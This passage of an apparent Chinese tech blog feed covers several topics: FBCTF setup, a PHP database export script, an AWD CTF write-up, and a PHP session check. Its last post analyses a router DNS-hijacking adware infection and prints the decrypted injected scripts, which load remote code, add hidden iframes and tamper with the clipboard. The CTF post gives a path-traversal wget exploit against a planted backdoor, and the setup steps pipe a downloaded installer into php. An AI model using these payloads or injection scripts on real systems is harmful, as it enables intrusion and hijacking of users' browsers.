title="搭建FBCTF"></a>搭建FBCTF</h1><h2 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h2><blockquote><p>由于众所周知的原因，以下部分内容需要梯子来进行【会注明】</p></blockquote><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p><code>apt-get install git</code></p><h2 id="抓取仓库"><a href="#抓取仓库" class="headerlink" title="抓取仓库"></a>抓取仓库</h2><p><code>git clone https://github.com/facebook/fbctf</code></p><h2 id="上传lang-zh-cn到src-language汉化"><a href="#上传lang-zh-cn到src-language汉化" class="headerlink" title="上传lang_zh-cn到src_language汉化"></a>上传lang_zh-cn到src_language汉化</h2><p>下载地址：<a href="https://blog.ctftools.com/2017/03/post106/">https://blog.ctftools.com/2017/03/post106/</a></p><blockquote><p>以下内容为需要梯子的部分</p></blockquote><h2 id="解决dl-hhvm-com超时问题"><a href="#解决dl-hhvm-com超时问题" class="headerlink" title="解决dl.hhvm.com超时问题"></a>解决dl.hhvm.com超时问题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;140.211.166.134 dl.hhvm.com&#x27; &gt;&gt; /etc/hosts</span><br><span class="line">wget -O - http://dl.hhvm.com/conf/hhvm.gpg.key | sudo apt-key add -</span><br><span class="line">echo deb http://dl.hhvm.com/ubuntu trusty main | sudo tee /etc/apt/sources.list.d/hhvm.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install hhvm</span><br></pre></td></tr></table></figure><p>安装composer国内镜像加速下载:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br><span class="line">composer config -g repositories.packagist composer http://packagist.phpcomposer.com</span><br><span class="line">composer install --profile --no-dev</span><br></pre></td></tr></table></figure><h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><p>从<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a> 下载源码压缩包 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar zxvf ./xxxxxx</span><br><span class="line">apt-get install build-essential   //安装G++</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p><code>mkdir -p /var/www/fbctf</code></p><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><p><code>./extra/provision.sh -m prod -s $PWD </code></p><blockquote><p>具体参考<br><a href="https://github.com/facebook/fbctf/wiki/Quick-Setup-Guide">https://github.com/facebook/fbctf/wiki/Quick-Setup-Guide</a><br><a href="https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/">https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/</a></p></blockquote><h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p><img src="/images/z888f7h.png"><br>主页</p><p><img src="/images/VtcnpIz.png"><br>后台</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://blog.csdn.net/sunxiaoju/article/details/51993091">https://blog.csdn.net/sunxiaoju/article/details/51993091</a></p><p><a href="https://blog.ctftools.com/2017/03/post122/">https://blog.ctftools.com/2017/03/post122/</a></p><p><a href="https://blog.ctftools.com/2017/03/post106/">https://blog.ctftools.com/2017/03/post106/</a></p><p><a href="https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/">https://blog.0wning.me/2017/10/21/%E5%9B%BD%E5%86%85%E6%90%AD%E5%BB%BAFBCTF%E5%B9%B3%E5%8F%B0/</a></p><p><a href="https://brucetg.github.io/2018/04/30/ubuntu14-04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%90%AD%E5%BB%BAfbctf%E7%BA%BF%E4%B8%8A%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0/">https://brucetg.github.io/2018/04/30/ubuntu14-04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%90%AD%E5%BB%BAfbctf%E7%BA%BF%E4%B8%8A%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0/</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/78294562">https://blog.csdn.net/wy_97/article/details/78294562</a></p><p><a href="http://www.chengweiyang.cn/2016/03/07/transparent-cache-cause-apt-get-hash-sum-mismatch/">http://www.chengweiyang.cn/2016/03/07/transparent-cache-cause-apt-get-hash-sum-mismatch/</a></p><p><a href="http://dockone.io/article/366">http://dockone.io/article/366</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原生PHP导出数据库</title>
      <link href="/p/c371.html"/>
      <url>/p/c371.html</url>
      
        <content type="html"><![CDATA[<p>网上找了下相关代码基本都是有语法错误的，挑了个错误少的改了改</p><span id="more"></span><p>通过测试的环境</p><blockquote><p>CentOS7.1<br>PHP7.2.10<br>MySQL5.7.23<br>Apache 2.4.34</p></blockquote><p>代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//配置信息</span></span><br><span class="line"><span class="variable">$cfg_dbhost</span>      = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg_dbname</span>      = <span class="string">&#x27;&#x27;</span>;<span class="comment">//数据库名</span></span><br><span class="line"><span class="variable">$cfg_dbuser</span>      = <span class="string">&#x27;&#x27;</span>;<span class="comment">//数据库用户</span></span><br><span class="line"><span class="variable">$cfg_dbpwd</span>       = <span class="string">&#x27;&#x27;</span>;<span class="comment">//数据库密码</span></span><br><span class="line"><span class="variable">$cfg_db_language</span> = <span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$to_file_name</span>    = <span class="string">&quot;dbname.sql&quot;</span>; <span class="comment">//你即将导出的数据库命名</span></span><br><span class="line"><span class="comment">// END 配置</span></span><br><span class="line"><span class="comment">//链接数据库</span></span><br><span class="line"><span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$cfg_dbhost</span>, <span class="variable">$cfg_dbuser</span>, <span class="variable">$cfg_dbpwd</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$link</span>, <span class="variable">$cfg_dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择编码</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names &quot;</span> . <span class="variable">$cfg_db_language</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库中有哪些表</span></span><br><span class="line"><span class="variable">$tables</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;SHOW TABLES FROM &quot;</span> . <span class="variable">$cfg_dbname</span>);</span><br><span class="line"><span class="comment">//将这些表记录到一个数组</span></span><br><span class="line"><span class="variable">$tabList</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$tabList</span>[] = <span class="variable">$row</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;运行中，请耐心等待...&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span> = <span class="string">&quot;-- ----------------------------\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$info</span> .= <span class="string">&quot;-- 日期：&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">time</span>()) . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$info</span> .= <span class="string">&quot;-- ----------------------------\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./db_backup/&#x27;</span>. <span class="variable">$to_file_name</span>, <span class="variable">$info</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将每个表的表结构导出到文件</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$tabList</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="variable">$sql</span>  = <span class="string">&quot;show create table &quot;</span> . <span class="variable">$val</span> . <span class="string">&quot;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span>  = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span>  = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span>);</span><br><span class="line">    <span class="variable">$info</span> = <span class="string">&quot;-- ----------------------------\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$info</span> .= <span class="string">&quot;-- Table structure for `&quot;</span> . <span class="variable">$val</span> . <span class="string">&quot;`\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$info</span> .= <span class="string">&quot;-- ----------------------------\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$info</span> .= <span class="string">&quot;DROP TABLE IF EXISTS `&quot;</span> . <span class="variable">$val</span> . <span class="string">&quot;`;\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$sqlStr</span> = <span class="variable">$info</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&quot;;\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//追加到文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./db_backup/&#x27;</span>. <span class="variable">$to_file_name</span>, <span class="variable">$sqlStr</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_free_result</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将每个表的数据导出到文件</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$tabList</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from &quot;</span> . <span class="variable">$val</span> . <span class="string">&quot;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">//如果表中没有数据，则继续下一张表</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$res</span>) &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="string">&quot;-- ----------------------------\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$info</span> .= <span class="string">&quot;-- Records for `&quot;</span> . <span class="variable">$val</span> . <span class="string">&quot;`\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$info</span> .= <span class="string">&quot;-- ----------------------------\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./db_backup/&#x27;</span>. <span class="variable">$to_file_name</span>, <span class="variable">$info</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取数据</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">        <span class="variable">$sqlStr</span> = <span class="string">&quot;INSERT INTO `&quot;</span> . <span class="variable">$val</span> . <span class="string">&quot;` VALUES (&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$zd</span>) &#123;</span><br><span class="line">            <span class="variable">$sqlStr</span> .= <span class="string">&quot;&#x27;&quot;</span> . <span class="variable">$zd</span> . <span class="string">&quot;&#x27;, &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//去掉最后一个逗号和空格</span></span><br><span class="line">        <span class="variable">$sqlStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$sqlStr</span>, <span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$sqlStr</span>) - <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$sqlStr</span> .= <span class="string">&quot;);\r\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./db_backup/&#x27;</span>. <span class="variable">$to_file_name</span>, <span class="variable">$sqlStr</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_free_result</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./db_backup/&#x27;</span>. <span class="variable">$to_file_name</span>, <span class="string">&quot;\r\n&quot;</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;导出成功，文件路径:./db_backup/&quot;</span>. <span class="variable">$to_file_name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯线下AWD【WEB】</title>
      <link href="/p/8c39.html"/>
      <url>/p/8c39.html</url>
      
        <content type="html"><![CDATA[<p>不得不说AWD对WEB狗越来越不友好了</p><span id="more"></span><p>Down下网站源码后上<code>Seay源代码审计工具</code>直接自动审计一波<br><img src="/images/zP3P6xS.png"><br>发现预留后门</p><p>路径<code>/sites/all/modules/avatar_uploader/lib/demo/view.php</code></p><p><img src="/images/s3uI9oR.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploadDir/<span class="subst">$file</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接构造POC:<code>wget http://ip:5072/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../flag</code><br>即可获取目标机上flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中检查会话是否过期</title>
      <link href="/p/97d8.html"/>
      <url>/p/97d8.html</url>
      
        <content type="html"><![CDATA[<p>在做项目时遇到了一个小需求</p><span id="more"></span><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>大概意思是要检测当前会话是否过期，网上搜了下基本都是用cookies记录的<br>想了下用Session也可以做</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>可以在登录时用<code>$_SESSION[&#39;Your_Name&#39;]</code>存储登录时的时间然后在访问后台每个页面必经的页面加入会话验证函数<br>大概函数如下<br>登录页在登录成功后加入：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="variable">$time</span>;</span><br></pre></td></tr></table></figure><p>函数中加入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检测会话是否过期</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckSession</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line">    <span class="variable">$session_time</span>   = <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>];</span><br><span class="line">    <span class="variable">$timeout</span>        = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$logon_out_time</span> = <span class="title function_ invoke__">strtotime</span>(<span class="variable">$timeout</span>) - <span class="title function_ invoke__">strtotime</span>(<span class="variable">$session_time</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$session_time</span>) || <span class="variable">$session_time</span> == <span class="string">&#x27;&#x27;</span> || <span class="variable">$logon_out_time</span> &gt;= <span class="number">900</span>)<span class="comment">//检测是否大于15分钟未响应 </span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">        <span class="title function_ invoke__">sweetalert</span>(<span class="string">&#x27;会话过期&#x27;</span>, <span class="string">&#x27;当前会话已超时(15分钟未操作)，请重新登录&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;返回&#x27;</span>, <span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置新会话时间</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetNewSessionTime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在必经页面加入函数<code>SetNewSessionTime</code>来证明处于活动状态</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">......Your Codes</span><br><span class="line"><span class="comment">//加载完再做会话验证</span></span><br><span class="line"><span class="title function_ invoke__">CheckSession</span>();</span><br><span class="line"><span class="title function_ invoke__">SetNewSessionTime</span>();</span><br><span class="line">.....Your Codes</span><br></pre></td></tr></table></figure><p>最后超时效果如下：<br><img src="/images/U2cXmLj.png"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>斐讯路由DNS劫持</title>
      <link href="/p/c6b1.html"/>
      <url>/p/c6b1.html</url>
      
        <content type="html"><![CDATA[<p>可能是太久没见广告了吧……<br>突然间弹了个牛皮癣</p><span id="more"></span><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在进行线上环境调试时习惯性的按了F12看看前端<br>结果发现<code>Console</code>里有了点不该有的东西<br><img src="/images/jGDQa7l.png"><br>移动端访问非<code>HTTPS</code>网站更是直接弹了个广告<br><img src="/images/Xwte7nb.jpg"><br>PC端挂着移动端的UA一样弹广告<br><img src="/images/Bn22QuR.png"><br>很好 你成功的引起了我的注意</p><h1 id="追查"><a href="#追查" class="headerlink" title="追查"></a>追查</h1><p>首先发现<code>console</code>里请求的JS为<br><code>https://cnd.newapi.com/sdk/cnzz.js?v8</code>和<code>https://logs.newapi.com/jd/ad?f=zq18</code></p><p>ad内容解密后：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">amb_jd_proxy_domain</span>=<span class="string">&quot;logs.newapi.com&quot;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">amb_jd_cdn_domain</span>=<span class="string">&quot;cnd.newapi.com&quot;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">amb_jd_proxy_f</span>=<span class="string">&quot;zq18&quot;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">amb_jd_proxy_c</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">amb_jd_cnzz_id</span>=<span class="string">&quot;1274015796&quot;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">amb_jd_tongji_url</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">amb_auto_load_ad_js</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> d = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    c.<span class="property">src</span> = a;</span><br><span class="line">    d.<span class="title function_">appendChild</span>(c);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> b === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">        c.<span class="property">onload</span> = c.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!c.<span class="property">readyState</span> || <span class="regexp">/loaded|complete/</span>.<span class="title function_">test</span>(c.<span class="property">readyState</span>)) &#123;</span><br><span class="line">                <span class="title function_">b</span>()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">amb_auto_load_ad_js</span>(<span class="string">&quot;https://&quot;</span> + <span class="variable language_">window</span>.<span class="property">amb_jd_cdn_domain</span> + <span class="string">&quot;/sdk/cnzz.js?v8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">amb_create_iframe</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    a.<span class="property">frameborder</span> = <span class="number">0</span>;</span><br><span class="line">    a.<span class="property">src</span> = <span class="string">&quot;https://&quot;</span> + <span class="variable language_">window</span>.<span class="property">amb_jd_cdn_domain</span> + <span class="string">&quot;/sdk/cnzz.php?p=&quot;</span> + <span class="variable language_">window</span>.<span class="property">amb_jd_proxy_f</span> + <span class="string">&quot;&amp;siteid=&quot;</span> + <span class="variable language_">window</span>.<span class="property">amb_jd_cnzz_id</span>;</span><br><span class="line">    a.<span class="property">frameBorder</span> = <span class="number">0</span>;</span><br><span class="line">    a.<span class="property">width</span> = <span class="string">&quot;1px&quot;</span>;</span><br><span class="line">    a.<span class="property">height</span> = <span class="string">&quot;1px&quot;</span>;</span><br><span class="line">    a.<span class="property">scrolling</span> = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> amb_iframe_time = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Clipboard</span> = [];</span><br><span class="line">        clipboard = <span class="literal">null</span></span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>) &#123;</span><br><span class="line">        <span class="title function_">amb_create_iframe</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (amb_iframe_time == <span class="string">&quot;no&quot;</span> &amp;&amp; <span class="variable language_">document</span>.<span class="property">body</span>) &#123;</span><br><span class="line">                <span class="title function_">amb_create_iframe</span>();</span><br><span class="line">                amb_iframe_time = <span class="string">&quot;yes&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1500</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>ad请求了cnzz.js，解密后内容为</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">h</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> g = &#123;</span><br><span class="line">        <span class="attr">trigger</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">dd</span>: <span class="variable language_">document</span>,</span><br><span class="line">        <span class="attr">ww</span>: <span class="variable language_">window</span>,</span><br><span class="line">        <span class="attr">listener</span>: [],</span><br><span class="line">        <span class="attr">listenerTouchend</span>: [],</span><br><span class="line">        <span class="attr">listenerCopy</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">text</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">action</span>: <span class="string">&quot;copy&quot;</span>,</span><br><span class="line">        <span class="attr">ua</span>: <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">userAgent</span>,</span><br><span class="line">        <span class="attr">host</span>: location.<span class="property">protocol</span> + <span class="string">&quot;//&quot;</span> + location.<span class="property">host</span>,</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="attr">token</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">hascopy</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">hasload</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">hascopy2</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">closeqq</span>: <span class="string">&quot;no&quot;</span>,</span><br><span class="line">        <span class="attr">showAd</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">id</span> = <span class="variable language_">window</span>.<span class="property">amb_jd_proxy_f</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">this</span>;</span><br><span class="line">            a.<span class="property">trigger</span> = a.<span class="property">dd</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            a.<span class="title function_">showAd</span>();</span><br><span class="line">            a.<span class="property">hascopy</span> = a.<span class="title function_">sGet</span>(<span class="string">&quot;amb_jd_copy&quot;</span>);</span><br><span class="line">            a.<span class="property">hasload</span> = a.<span class="title function_">sGet</span>(<span class="string">&quot;amb_jd_load&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> == a.<span class="title function_">sGet</span>(<span class="string">&quot;amb_jd_open&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="literal">null</span> != a.<span class="title function_">sGet</span>(<span class="string">&quot;amb_jd_open_info&quot;</span>) ? (b = a.<span class="title function_">sGet</span>(<span class="string">&quot;amb_jd_open_info&quot;</span>)) : (b = a.<span class="title function_">randomString</span>(), a.<span class="title function_">sSet</span>(<span class="string">&quot;amb_jd_open_info&quot;</span>, b, <span class="variable language_">window</span>.<span class="property">amb_jd_proxy_c</span>));</span><br><span class="line">                a.<span class="title function_">_ajax</span>(<span class="string">&quot;//&quot;</span> + <span class="variable language_">window</span>.<span class="property">amb_jd_proxy_domain</span> + <span class="string">&quot;/jd/gettokenv2?callback=jsonp&quot;</span> + b, &#123;</span><br><span class="line">                    <span class="attr">f</span>: a.<span class="property">id</span>,</span><br><span class="line">                    <span class="attr">h</span>: a.<span class="property">hasload</span>,</span><br><span class="line">                    <span class="attr">current_url</span>: <span 